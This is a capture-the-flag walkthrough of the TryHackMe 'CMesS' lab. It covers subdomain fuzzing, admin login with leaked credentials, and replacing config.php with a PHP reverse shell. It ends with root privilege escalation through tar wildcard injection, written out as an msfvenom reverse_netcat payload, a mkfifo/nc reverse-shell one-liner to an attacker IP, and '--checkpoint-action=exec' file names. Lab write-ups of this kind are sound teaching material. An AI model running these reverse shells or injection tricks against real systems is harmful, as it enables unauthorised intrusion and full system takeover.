---
description: https://tryhackme.com/room/cmess
---

# CMesS

## Nmap

```
sudo nmap 10.10.150.164 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
(Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add cmess.thm to /etc/hosts
{% endhint %}

Root page for http://cmess.thm takes us to the following for Gila CMS.

![](<../../../.gitbook/assets/image (923).png>)

I was unable to accurately determine the version so tried a few of the available exploits and was unsuccessful in making any progress. Further directory enumeration did not provided any further results of value.

From here I attempted sub domain brute forcing with `wfuzz` to help identify any other avenues of exploitation.

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -t 42 --hl 107 
```

This showed that the 'dev' subdomain is valid.

![](<../../../.gitbook/assets/image (924) (1).png>)

{% hint style="info" %}
add the dev.cmess.thm domain to /etc/hosts.
{% endhint %}

Browsing to http://dev.cmess.thm shows the following page which contains user credentials:

![http://dev.cmess.thm/](<../../../.gitbook/assets/image (925).png>)

Moving over to http://cmess.thm/admin/ we are then able to login as the user.

![http://cmess.thm/admin/](<../../../.gitbook/assets/image (926).png>)

Moving over to the /fm/ directory we have some files we can view and edit the contents of. The contents of config.default.php contain some important credentials. `root:r0otus3rpassw0rd`

![](<../../../.gitbook/assets/image (927).png>)

For a reverse shell I replaced the contents of config.php with a PHP reverse shell.

![](<../../../.gitbook/assets/image (928).png>)

After saving changes I then browsed to [http://cmess.thm/index.php](http://cmess.thm/index.php) and was able to receive a shell on my `netcat` listener.

![](<../../../.gitbook/assets/image (930).png>)

After performing some manual enumeration we find a .password.bak file in the /opt/ directory containing the password for andres.

![](<../../../.gitbook/assets/image (929).png>)

Which can be used to login over SSH.

![](<../../../.gitbook/assets/image (931).png>)

The home directory for andres has a directory called backup. Reading the note contained within informs us anything inside it will be backed up.

![](<../../../.gitbook/assets/image (932).png>)

Assuming a process is being executed on a regular interval we can run psp64 (downloaded from our attacking machine) to identify processes being run.

![](<../../../.gitbook/assets/image (933).png>)

We can see our pspy64 file has already been backed up. Directly underneath we can see the command being executed.

```
/bin/sh -c    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz * 
```

As the tar command ends in a wild card we can perform injection to grab a root shell. This is covered in greater details here: [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930).

Essentially when the tar command runs we can specify a checkpoint and a action to be performed by that checkpoint. As the process is being executed by root this leads to privilege escalation.

I first confirmed `nc` was installed on the target machine using `which nc`. I then used msfvenom to create a `netcat` payload.

```
cmd/unix/reverse_netcat LHOST=10.14.3.108 LPORT=80  
```

I then run the following commands inside the backup directory ensuring the msfvenom payload is included. After this has completed set a `netcat` listener on the attacking machine.

```
echo "mkfifo /tmp/tjbtd; nc 10.14.3.108 80 0</tmp/tjbtd | /bin/sh >/tmp/tjbtd 2>&1; rm /tmp/tjbtd" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 shell.sh
```

Soon after the backup job will run again and we will land a root shell.

![](<../../../.gitbook/assets/image (934).png>)
